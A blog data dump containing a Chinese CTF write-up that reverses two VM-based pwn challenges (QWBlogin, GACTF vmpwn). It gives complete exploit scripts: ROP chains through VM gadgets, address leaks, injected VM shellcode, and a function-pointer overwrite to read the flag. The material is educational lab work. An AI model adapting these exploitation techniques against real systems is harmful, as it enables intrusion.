关于本站</h2><p>菜鸡的叽里咕噜</p>\n<h2 id=\"👨‍💻-博主是谁\"><a href=\"#👨‍💻-博主是谁\" class=\"headerlink\" title=\"👨‍💻 博主是谁\"></a>👨‍💻 博主是谁</h2><p>Vang3lis<br>本科 BIT 之后会继续做点研究<br>CTFer 在CTF比赛中喜欢做 pwn 题 （但是我很菜</p>\n<h2 id=\"⛹-兴趣爱好\"><a href=\"#⛹-兴趣爱好\" class=\"headerlink\" title=\"⛹ 兴趣爱好\"></a>⛹ 兴趣爱好</h2><p>Dota2</p>\n<h2 id=\"📬-联系我呀\"><a href=\"#📬-联系我呀\" class=\"headerlink\" title=\"📬 联系我呀\"></a>📬 联系我呀</h2><p>E-mail: <a href=\"mailto:&#x76;&#97;&#110;&#x67;&#x33;&#x6c;&#105;&#x73;&#x2e;&#48;&#x78;&#49;&#51;&#64;&#x67;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;\">&#x76;&#97;&#110;&#x67;&#x33;&#x6c;&#105;&#x73;&#x2e;&#48;&#x78;&#49;&#51;&#64;&#x67;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a><br>Github: <a href=\"https://github.com/Vang3lis\">https://github.com/Vang3lis</a></p>\n","site":{"data":{"fluid_config":{"favicon":"/img/favicon.png","apple_touch_icon":"/img/favicon.png","title_join_string":" - ","force_https":false,"highlight":{"enable":true,"style":"Github Gist","bg_color":false,"copy_btn":true},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"tajs":null,"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"0x13","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"category","link":"/categories/","icon":"iconfont icon-category-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":false,"source":"busuanzi","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/default.png","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":false,"tag":true}},"page":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/default.png","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"{} 字"},"min2read":{"enable":true,"format":"{} 分钟","words":100},"views":{"enable":false,"source":"busuanzi","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":false,"type":"disqus"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":null,"appkey":null,"placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":null},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"archive":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":null},"category":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":null,"post_limit":10,"order_by":"-length"},"tag":{"banner_img":"/img/default.png","banner_img_height":80,"banner_mask_alpha":0.3,"subtitle":null,"tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":null,"avatar":"/img/avatar.png","name":"Vang3lis","introduce":"","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com/Vang3lis","tip":"GitHub"}]},"page404":{"banner_img":"/img/default.png","banner_img_height":85,"banner_mask_alpha":0.3,"subtitle":"Page not found"},"links":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":null,"items":[{"title":"M4x","link":"https://m4x.fun"},{"title":"Lancern","link":"https://lancern.github.io"},{"title":"ZPY","link":"https://github.com/peterzpy"},{"title":"felinae98","link":"https://code.felinae98.cn"},{"title":"Aloxaf","link":"https://aloxaf.com"},{"title":"FKY","link":"https://blog.fkynjyq.com"},{"title":"l1b0","link":"https://l1b0.fun/"}]}}}},"excerpt":"","more":"<blockquote>\n<p>欢迎来到我的小站呀，很高兴遇见你！🤝</p>\n</blockquote>\n<h2 id=\"🏠-关于本站\"><a href=\"#🏠-关于本站\" class=\"headerlink\" title=\"🏠 关于本站\"></a>🏠 关于本站</h2><p>菜鸡的叽里咕噜</p>\n<h2 id=\"👨‍💻-博主是谁\"><a href=\"#👨‍💻-博主是谁\" class=\"headerlink\" title=\"👨‍💻 博主是谁\"></a>👨‍💻 博主是谁</h2><p>Vang3lis<br>本科 BIT 之后会继续做点研究<br>CTFer 在CTF比赛中喜欢做 pwn 题 （但是我很菜</p>\n<h2 id=\"⛹-兴趣爱好\"><a href=\"#⛹-兴趣爱好\" class=\"headerlink\" title=\"⛹ 兴趣爱好\"></a>⛹ 兴趣爱好</h2><p>Dota2</p>\n<h2 id=\"📬-联系我呀\"><a href=\"#📬-联系我呀\" class=\"headerlink\" title=\"📬 联系我呀\"></a>📬 联系我呀</h2><p>E-mail: <a href=\"mailto:&#x76;&#97;&#110;&#x67;&#x33;&#x6c;&#105;&#x73;&#x2e;&#48;&#x78;&#49;&#51;&#64;&#x67;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;\">&#x76;&#97;&#110;&#x67;&#x33;&#x6c;&#105;&#x73;&#x2e;&#48;&#x78;&#49;&#51;&#64;&#x67;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a><br>Github: <a href=\"https://github.com/Vang3lis\">https://github.com/Vang3lis</a></p>\n"}],"Post":[{"title":"QWBlogin & GACTF vmpwn","date":"2020-08-25T11:26:30.000Z","published":1,"hideInList":false,"feature":null,"isTop":false,"_content":"\n\n\n强网杯的一个虚拟机的题目，之前做过虚拟机的题目但是都没做出来，这次打比赛的时候由于有其他的事情，就做了一点就没做了，然后今天把这个题目磨出来了。\n\n\n\n打完 `GACTF2020` 之后把其中的`vmpwn`也添加在此\n\n\n\n## QWBlogin\n\n该题给了一个 `emulator`虚拟机，运行的类似机器码的`test.bin`和`launch.sh`，之后`tips`的时候给了`Instruction.h`\n\n\n\n### 逆向\n\n#### main 函数\n\n基本上程序运行依靠一个虚拟机的结构体，可以从`main`里面看到就是 `v9`结构体，后文会将介绍该结构体\n\n```c\nint main(int argc, char** argv)\n{\n    len = sub_ba0(argv[1]);\n    if(len <= 0)\n        exit(0);\n    \n    fd = open(argv[1], 0);\n    if(fd < 0)\n        exit(0);\n    \n    v8 = mmap(0, len, 1, 2, fd, 0);\n    if(!v8)\n        exit(0);\n    \n    // check image format\n    if(memcmp(v8, \"\\x61\\xde\\x10\\ef\", 4))\n        exit(2);\n    \n    // check lenth\n    // segment?\n\n    // v8[6, 14) ~ [14, 22) lenth\n    if( *(int64_t*)(v8+6) > len || *(int64_t*)(v8+14) > len - *(int64_t*)(v8+6) )\n        exit(3);\n    \n    // v8[22, 30) ~ [30, 38)\n    if( *(int64_t*)(v8+22) > len || *(int64_t*)(v8+30) > len - *(int64_t*)(v8+22) )\n        exit(4);\n\n    // v[38, 46) > v8[14, 22)\n    if( *(int64_t*)(v8+38) >= *(int64_t*)(v8+14) ) \n        exit(5);\n\n    v9 = calloc(0xD0, 1);\n    // v[6, 14) == offset v{14, 22) == segment_size\n    // v9[21] = calloc(1, v8[14, 22)) 0x1000 向上取整\n    v9[21] = calloc(1, v8[14, 22))\n    memcpy(v9[21], &(v8[v8[6, 14)]),  v8[14, 22))\n    v[20] = segment_size;\n\n    // \n    v9[23] = calloc(1, v8[30, 38))\n    memcpy(v9[23], &(v8[v8[22, 30)]), v8[30, 38))\n    v9[22] = segment_size; \n\n    v9[25] = calloc(1, 0x20 000);\n    v9[24] = 0x20 000;\n    v9[18] = v8[38, 46)\n\n    g_Var = calloc(0x18, 1);\n    memset(g_Var, 0x18, 0);\n\n    //链表结构 可能记录 segment flag 的\n    // g_Var[0x10, 0x18) -> struct_18 -> struct_18;\n    \n          \n    while(!sub_c1a(v9))\n    {}\n}\n```\n\n然后进入`c1a`结构体的时候，会发现`IDA`报出该函数太大无法分析，只能另外用`Ghidra`看能不能分析，然后发现能够反编译，于是对其进行`dump`反编译的文本进行分析\n\n\n\n#### VM struct\n\n其中关键的结构体被逆出来是如下\n\n```c\nstruct VM\n{\n    int64_t r00;\n    int64_t r01;\n    int64_t r02;\n    int64_t r03;\n    int64_t r04;\n    int64_t r05;\n    int64_t r06;\n    int64_t r07;\n    int64_t r08;\n    int64_t r09;\n    int64_t r0a;\n    int64_t r0b;\n    int64_t r0c;\n    int64_t r0d;\n    int64_t r0e;\n    int64_t r0f;\n    int64_t r10;\n    int64_t r11;\n    int64_t pc;             // vm[0x12]\n    int64_t flags;          // vm[0x13]\n    int64_t text_size;      // vm[0x14]\n    int64_t text_segment;   // vm[0x15]\n    int64_t data_size;      // vm[0x16]\n    int64_t data_segment;   // vm[0x17]\n    int64_t io_file;        // 0x18 struct (int_no=0) -> 0x18 (int_no=1) -> 0x18 (int_no=2)\n    int64_t stack;          // vm[0x19]\n    // int64_t \n};\n```\n\n前面是寄存器，后面是一些段和存储的`io_file`链和虚拟的栈\n\n\n\n#### op[1]\n\n在`0xc1a`程序的开始先会判断当前`op`是否`<2`如果`<2`则退出，说明每一个指令至少都有两个字节，之后用了`op[1]&0xf`进行`switch case`判断当前指令长度\n\n```c\nswitch op[1]&0xf\n    case 0x00, 0x0b, 0xc, 0xd, 0xe, \n        4\n    case 0x01, 0x02, 0x03, 0x04,\n        0xb\n    case 0x5:\n        0x15: int8_t 4\n        0x25: int16_t 5\n        0x35: int32_t 7\n        0x45: int64_t 0xb \n    case 0x6:\n        3\n    case 0x7:\n        0x17: int8_t 3\n        0x27: int16_t 4\n        0x37: int32_t 6\n        0x47: int64_t 10\n    case 0x8:\n        if op[0] == 0x20:\n            2\n        else:\n            10\n    case 0x9:\n        if op[0] != 0x20 && a[0x14] - a[0x12] < 10\n            return 1;\n    case 0xa:\n        2\n    default:\n        return 1;\n```\n\n\n\n#### 思考\n\n在最开始的时候傻乎乎的顺着`dump`的函数逆，后来逆完`MOV`之后觉得其中`MUL/DIV/MOD`等一些内容都可以不用逆，然后我让一个学弟帮忙逆`XOR/OR/AND`等一些其他的，我去逆`JMP`这整个，后来觉得这个思路错了，其实如果`test.bin`的程序并没有自我修改的话，其实可以先根据`size`和`instrcution`把指令分了，再看是否需要逆一些指令，最后发现只有`mov pop push call ret jmp（中间少部分）syacall`需要很清楚的逆出来，其他的都可以不用逆。\n\n\n\n#### 整理\n\n最后需要的每个的情况都整理成如下模式\n\n```python\n# 20_syscall.c\nswitch op[0]:\n\n// SYSCALL\n// size == 2\ncase 0x20:\n    r00 == 0\n        op[1] == 0xa\n        \n        fd = open(data[r01], r02)\n        insert fd into vm.io_file\n\n    r00 == 1\n        op[1]&0xf == 0x8:\n            read(r01, data[r02], r03)\n\n        op[1]&0xf == 0x9\n            read(r01, stack[r02], r03)\n\n    r00 == 2\n        op[1]&0xf == 0x8:\n            write(r01, data[r02], r03)\n        \n        op[1]&0xf == 0x9:\n            write(r01, stack[r02], r03)\n\n    r00 == 3\n        close(r01)\n```\n\n\n\n#### 简易 emulator\n\n最后根据整理的`op[0] op[1]`进行编写简易的分开`test.bin`的程序\n\n```\nov r0, qword 0x45\ncall 0x45 0x1 0x53\nmov r1, qword 0xa756f5920656553\npush qword r1\nmov r0, qword 0x2\nmov r1, qword 0x1\nmov qword r2, r16\nmov r3, qword 0x8\nsyscall stack\nhlt\nmov r0, byte 0x2\nmov r1, byte 0x1\nmov r2, byte 0\nmov r3, byte 0x23\nsyscall data\nmov r0, byte 0x2\nmov r1, byte 0x1\nmov r2, byte 0x28\nmov r3, byte 0xb\nsyscall data\nmov r0, byte 0x1\nmov r1, byte 0\nmov r2, dword 0x40\nmov r3, qword 0x1\nsyscall data\nmov r8, byte ptr data[0x40]\ncmp r8, byte 0x51\t\t\t\t|Q\nje 0x2\nhlt\nmov r0, byte 0x1\nmov r1, byte 0\nmov r2, byte 0x40\nmov r3, byte 0x1\nsyscall data\nmov r8, byte ptr data[0x40]\ncmp r8, byte 0x57\t\t\t\t| W\njne 0x3\njmp 0x2\nhlt\nmov qword ptr data[0x40], r9\nmov r0, byte 0x1\nmov r1, word 0\nmov r2, word 0x40\nmov r3, byte 0x1\nsyscall data\nmov r8, byte ptr data[0x40]\nxor r8, byte 0x77\ncmp r8, byte 0x26\t\t\t\t| Q\njne 0xffffffc9\nmov qword ptr data[0x40], r9\nmov qword ptr data[0x48], r9\nmov qword ptr data[0x50], r9\nmov qword ptr data[0x58], r9\nmov qword ptr data[0x60], r9\nmov r0, byte 0x1\nmov r1, word 0\nmov r2, word 0x40\nmov r3, byte 0x21\nsyscall data\t\t\t\t\t| read(0, data[0x40], 0x21)\nxor qword r8, r8\nmov r8, qword ptr data[0x40]\t| G00DR3VR\nmov r9, qword 0x427234129827abcd\nxor qword r8, r9\ncmp r8, qword 0x10240740dc179b8a\nje 0x2\nhlt\nxor qword r8, r8\nmov r8, qword ptr data[0x48]\t| W31LD0N3\nmov r9, qword 0x127412341241dead\nxor qword r8, r9\ncmp r8, qword 0x213a22705e70edfa\nje 0x2\nhlt\nxor qword r8, r8\nmov r8, qword ptr data[0x50]\t| Try2Pwn!\nmov r9, qword 0x8634965812abc123\nxor qword r8, r9\ncmp r8, qword 0xa75ae10820d2b377\nje 0x2\nhlt\nxor qword r8, r8\nmov r8, qword ptr data[0x58]\t| GOGOGOGO\nmov r9, qword 0x123216781236789a\nxor qword r8, r9\ncmp r8, qword 0x5d75593f5d7137dd\nje 0x2\nhlt\nmov r0, byte 0x2\nmov r1, byte 0x1\nmov r2, byte 0x34\nmov r3, byte 0x6\nsyscall data\npush qword r17\nmov qword r17, r16\nsub r16, qword 0x100\nmov qword r4, r16\nmov r5, qword 0xa214f474f4721\npush qword r5\nmov r5, qword 0x574f4e54494e5750\npush qword r5\nmov qword r5, r16\nmov r0, byte 0x2\nmov r1, byte 0x1\nmov qword r2, r16\nmov r3, byte 0xf\nsyscall stack\nmov r0, byte 0x1\nmov r1, byte 0\nmov qword r2, r4\nmov r3, qword 0x800\nsyscall stack\t\t\t\t\t| read(0, stack[], 0x800)\ncmp r0, qword 0         \njnl 0x2\nhlt\nmov qword r3, r0\nmov r1, byte 0x1\nmov qword r2, r4\nmov r0, qword 0x2\nmov qword r16, r17      \npop qword r17\nret\n```\n\n于是程序就比较清晰了，如果输入了`password`为`QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO`就能走到最后溢出的地方\n\n最后在`read(0, stack, 0x800)`的地方会出现溢出，然后在`ret`的时候把栈上的内容`pop`到`vm.pc`，于是就需要在`test.bin`里面找到可以用`gadgets`\n\n\n\n### pwn\n\n#### gadgets\n\n在程序`RET`之后还有一大段无关的`opcode`，做到这步的时候才知道，这些就是为了凑`gadgets`的\n\n其中标记为`R`的是不需要限制的\n\n```python\n# 0x0d 0xR6 0x00 0x11 0xRR\npop_r00_ret = 0x2f5         # 0x46\n# 0x0d 0xR6 0x01 0X11 0xRR\npop_r01_ret = 0x377         # 0x46\n# 0x0d 0xR6 0x02 0x11 0xRR\npop_r02_ret = 0x45c         # 0x46\n# 0x0d 0xR6 0x03 0x11 0xRR\npop_r03_ret = 0x4e1         # 0x46\n\n# 0x20 0x0a 0x11 0xRR\nsys_open_ret = 0x6ed\n# 0x20 0xR8 0x11 0xRR\nsys_data_ret = 0x5b1\n# 0x20 0xR9 0x11 0xRR\nsys_stack_ret = 0x617\n```\n\n\n\n#### exp\n\n由于`syscall`中只有`open | read | write | close`可用，很自然想到`orw`，然后构造`rop`链就行了，其中由于最开始打开了`test.bin`文件，所以`fd=4`，最初写`exp`的时候被坑了一下，以及调试的时候希望能有结构体的符号，我编译了`struct.c => struct.o`再在调试的时候`add-symbol-file struct.o 0`即可\n\n\n\n```python\npayload = b\"A\"*0x108\n# read(0, data[0x100], 0x20)\n# r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20\npayload += p64(pop_r00_ret) + p64(1) + p64(pop_r01_ret) + p64(0) + p64(pop_r02_ret) + p64(0x100) + p64(pop_r03_ret) + p64(0x20)\npayload += p64(sys_data_ret)\n\n# open(data[0x100], 0)\n# r00 = 0 r01 = 0x200 r02 = 0\npayload += p64(pop_r00_ret) + p64(0) + p64(pop_r01_ret) + p64(0x100) + p64(pop_r02_ret) + p64(0)\npayload += p64(sys_open_ret)\n\n# read(4, data[0x100], 0x30)\n# r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30\npayload += p64(pop_r00_ret) + p64(1) + p64(pop_r01_ret) + p64(0x4) + p64(pop_r02_ret) + p64(0x100) + p64(pop_r03_ret) + p64(0x30)\npayload += p64(sys_data_ret)\n\n# write(1, data[0x100], 0x30)\n# r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30\npayload += p64(pop_r00_ret) + p64(2) + p64(pop_r01_ret) + p64(0x1) + p64(pop_r02_ret) + p64(0x100) + p64(pop_r03_ret) + p64(0x30)\npayload += p64(sys_data_ret)\n```\n\n\n\n强的大佬，不需要`instruction.h`都能在5个小时内做出来，而我就是只菜鸡\n\n[QWBlogin 题目](<https://github.com/Vang3lis/CTF_repo/tree/master/QWB_2020/QWBlogin>)\n\n\n\n## VMpwn\n\n这个题目跟上一个题目一样先逆向，但是这个题目跟`QWBlogin`相比实现`vm`的时候简单一些\n\n其中有一个 `chunk 0x30`用来记录寄存器的值`vm[0] vm[1] vm[2]` 类似`rdi, rsi, rdx`在`syscall`时会用到，`vm[3]`为`sp`，`vm[5]`为 `pc`\n\n在最后的关键操作为对于`read(0, stack, 0x1000)`（栈只有`0x100`个字节）\n\n```assembly\npwndbg> distance 0x555555759050 0x55555575ad68\n0x555555759050->0x55555575ad68 is 0x1d18 bytes (0x3a3 words)\n\n RAX  0x7ffff7b156c0 (read) ◂— cmp    dword ptr [rip + 0x2c3039], 0\n ► 0x5555555555db    call   rax <0x7ffff7b156c0>\n        fd: 0x0\n        buf: 0x55555575ad68 ◂— 0x0\n        nbytes: 0x1000\n\npwndbg> telescope 0x555555758010\n00:0000│   0x555555758010 ◂— 0x0\n01:0008│   0x555555758018 —▸ 0x55555575ad68 ◂— 0x0\n02:0010│   0x555555758020 ◂— 0x1000\n03:0018│   0x555555758028 —▸ 0x55555575ad68 ◂— 0x0\n04:0020│   0x555555758030 ◂— 0x0\n05:0028│   0x555555758038 —▸ 0x5555557572d6 ◂— 0x772c6b6f11028f10\n```\n\n然后`puts(stack)`，可以看到该虚拟栈上有`heap`地址和`elf`地址，但是只能泄漏一个\n\n```assembly\npwndbg> telescope 0x55555575ad68 0x30\n00:0000│ rsi  0x55555575ad68 ◂— '1234454636\\n'\n01:0008│      0x55555575ad70 ◂— 0xa3633 /* '36\\n' */\n02:0010│      0x55555575ad78 ◂— 0x0\n... ↓\n1e:00f0│      0x55555575ae58 —▸ 0x555555758050 ◂— 0x20746168772c6b6f ('ok,what ')\n1f:00f8│      0x55555575ae60 ◂— 0x0\n20:0100│      0x55555575ae68 —▸ 0x555555757851 ◂— 0xff\n```\n\n接下来同第一步的`read(0, stack, 0x1000)` `write(0, stack, 0x20)`然后`ret`\n\n\n\n这个程序中有一个两个比较奇怪的地方，由于`ret`的时候程序的实现，是将`sp-=8`，但是`PUSH`为`sp-=8` `POP`为`sp+=8`，因此`ret`的时候比较奇怪，另外就是与`QWBlogin`相比没有 什么能用的`gadget`，因此想法只能为按照`vm`的规则，写`shellocde`，然后在最后`ret`的时候跳转过去，但是该题用 `seccomp`限制了只能 `orw`，且没有给`open`的 `syscall`只能泄漏\n\n### 思路\n\n因此思路就是，先利用`puts`泄漏`elf`的地址，然后再`ret`到最初`elf_code+0x3`然后再泄漏`heap`，`ret`到写入栈上的`shellcode`\n\n利用`puts`泄漏`libc`，然后再次输入到栈上，利用`\\x6d: mov reg[0], 0`作为`nop`，编写`shellcode`\n\n然后将`open`写入`free`的位置，因此在调用`syscall 03`时就是调用`open`，最后利用`orw`进行读取`flag`\n\n### exp\n\n```python\n# heap+0x2e68 => elf_bss\n\nio.sendafter(\"name:\", \"A\"*0xff+\"#\")\n\nio.recvuntil(\"#\")\nelf.address = u64(io.recvn(6) + \"\\x00\\x00\") - 0x203851\nsuccess(\"elf\", elf.address)\n\n\n# 0xf8 + ret \nio.sendafter(\"say:\", \"A\"*0x100 + p64(elf.address + 0x203023))\n\nio.sendafter(\"name:\", \"\\x50\")\nheap = u64(io.recvn(6) + \"\\x00\\x00\") - 0x50\nsuccess(\"heap\", heap)\n\n'''\nmov reg[0], read_got\nputs\nmov reg[0], 0\nmov reg[1], heap + addr\nmov reg[2], 0x1000\nread        \n//  use 0x6d: mov reg[0], 0 as nop\n'''\n\npayload = \"\\x11\" + p64(elf.got['read'])\npayload += \"\\x8f\\x02\"\npayload += \"\\x6d\"\npayload += \"\\x12\" + p64(heap+0x2d60)\npayload += \"\\x13\" + p64(0x1000)\npayload += \"\\x8f\\x00\"\npayload = payload.ljust(0x100, \"A\")\npayload += p64(heap+0x2d60)\nio.sendafter(\"say:\", payload)\n\nio.recvuntil(\"bye~\\n\")\n\nlibc.address = u64(io.recvuntil(\"\\n\", drop=True).ljust(8, \"\\x00\")) - libc.sym['read']\n\n'''\nflag\n0x6d * 0x50\nmov reg[1], elf.address+0x203900\nmov reg[2], 8\nread\nmov reg[0], heap+0x2d60\nmov reg[1], 0\nopen\nmov reg[0], 3\nmov reg[1], bss\nmov reg[2], 0x30\nread\nmov reg[0], 1\nmov reg[1], bss\nmov reg[2], 0x30\nwrite\n'''\n\npayload = \"flag\\x00\"\npayload = payload.ljust(0x50, \"\\x6d\")\npayload += \"\\x12\" + p64(elf.address+0x2038f8)\npayload += \"\\x13\" + p64(8)\npayload += \"\\x8f\\x00\"\npayload += \"\\x11\" + p64(heap+0x2d60)\npayload += \"\\x6e\"\npayload += \"\\x8f\\x03\"\npayload += \"\\x11\" + p64(3)\npayload += \"\\x12\" + p64(elf.bss()+0x400)\npayload += \"\\x13\" + p64(0x30)\npayload += \"\\x8f\\x00\"\npayload += \"\\x11\" + p64(1)\npayload += \"\\x12\" + p64(elf.bss()+0x400)\npayload += \"\\x13\" + p64(0x30)\npayload += \"\\x8f\\x01\"\n\nio.send(payload)\n\nsleep(0.03)\n\nio.send(p64(libc.sym['open']))\n\nio.interactive()\nio.close()\n\n```\n\n","source":"_posts/qwblogin & GACTF vmpwn.md","raw":"---\ntitle: 'QWBlogin & GACTF vmpwn'\ndate: 2020-08-25 19:26:30\ncategory: CTF\ntags: [re,vm,pwn]\npublished: true\nhideInList: false\nfeature: \nisTop: false\n---\n\n\n\n强网杯的一个虚拟机的题目，之前做过虚拟机的题目但是都没做出来，这次打比赛的时候由于有其他的事情，就做了一点就没做了，然后今天把这个题目磨出来了。\n\n\n\n打完 `GACTF2020` 之后把其中的`vmpwn`也添加在此\n\n\n\n## QWBlogin\n\n该题给了一个 `emulator`虚拟机，运行的类似机器码的`test.bin`和`launch.sh`，之后`tips`的时候给了`Instruction.h`\n\n\n\n### 逆向\n\n#### main 函数\n\n基本上程序运行依靠一个虚拟机的结构体，可以从`main`里面看到就是 `v9`结构体，后文会将介绍该结构体\n\n```c\nint main(int argc, char** argv)\n{\n    len = sub_ba0(argv[1]);\n    if(len <= 0)\n        exit(0);\n    \n    fd = open(argv[1], 0);\n    if(fd < 0)\n        exit(0);\n    \n    v8 = mmap(0, len, 1, 2, fd, 0);\n    if(!v8)\n        exit(0);\n    \n    // check image format\n    if(memcmp(v8, \"\\x61\\xde\\x10\\ef\", 4))\n        exit(2);\n    \n    // check lenth\n    // segment?\n\n    // v8[6, 14) ~ [14, 22) lenth\n    if( *(int64_t*)(v8+6) > len || *(int64_t*)(v8+14) > len - *(int64_t*)(v8+6) )\n        exit(3);\n    \n    // v8[22, 30) ~ [30, 38)\n    if( *(int64_t*)(v8+22) > len || *(int64_t*)(v8+30) > len - *(int64_t*)(v8+22) )\n        exit(4);\n\n    // v[38, 46) > v8[14, 22)\n    if( *(int64_t*)(v8+38) >= *(int64_t*)(v8+14) ) \n        exit(5);\n\n    v9 = calloc(0xD0, 1);\n    // v[6, 14) == offset v{14, 22) == segment_size\n    // v9[21] = calloc(1, v8[14, 22)) 0x1000 向上取整\n    v9[21] = calloc(1, v8[14, 22))\n    memcpy(v9[21], &(v8[v8[6, 14)]),  v8[14, 22))\n    v[20] = segment_size;\n\n    // \n    v9[23] = calloc(1, v8[30, 38))\n    memcpy(v9[23], &(v8[v8[22, 30)]), v8[30, 38))\n    v9[22] = segment_size; \n\n    v9[25] = calloc(1, 0x20 000);\n    v9[24] = 0x20 000;\n    v9[18] = v8[38, 46)\n\n    g_Var = calloc(0x18, 1);\n    memset(g_Var, 0x18, 0);\n\n    //链表结构 可能记录 segment flag 的\n    // g_Var[0x10, 0x18) -> struct_18 -> struct_18;\n    \n          \n    while(!sub_c1a(v9))\n    {}\n}\n```\n\n然后进入`c1a`结构体的时候，会发现`IDA`报出该函数太大无法分析，只能另外用`Ghidra`看能不能分析，然后发现能够反编译，于是对其进行`dump`反编译的文本进行分析\n\n\n\n#### VM struct\n\n其中关键的结构体被逆出来是如下\n\n```c\nstruct VM\n{\n    int64_t r00;\n    int64_t r01;\n    int64_t r02;\n    int64_t r03;\n    int64_t r04;\n    int64_t r05;\n    int64_t r06;\n    int64_t r07;\n    int64_t r08;\n    int64_t r09;\n    int64_t r0a;\n    int64_t r0b;\n    int64_t r0c;\n    int64_t r0d;\n    int64_t r0e;\n    int64_t r0f;\n    int64_t r10;\n    int64_t r11;\n    int64_t pc;             // vm[0x12]\n    int64_t flags;          // vm[0x13]\n    int64_t text_size;      // vm[0x14]\n    int64_t text_segment;   // vm[0x15]\n    int64_t data_size;      // vm[0x16]\n    int64_t data_segment;   // vm[0x17]\n    int64_t io_file;        // 0x18 struct (int_no=0) -> 0x18 (int_no=1) -> 0x18 (int_no=2)\n    int64_t stack;          // vm[0x19]\n    // int64_t \n};\n```\n\n前面是寄存器，后面是一些段和存储的`io_file`链和虚拟的栈\n\n\n\n#### op[1]\n\n在`0xc1a`程序的开始先会判断当前`op`是否`<2`如果`<2`则退出，说明每一个指令至少都有两个字节，之后用了`op[1]&0xf`进行`switch case`判断当前指令长度\n\n```c\nswitch op[1]&0xf\n    case 0x00, 0x0b, 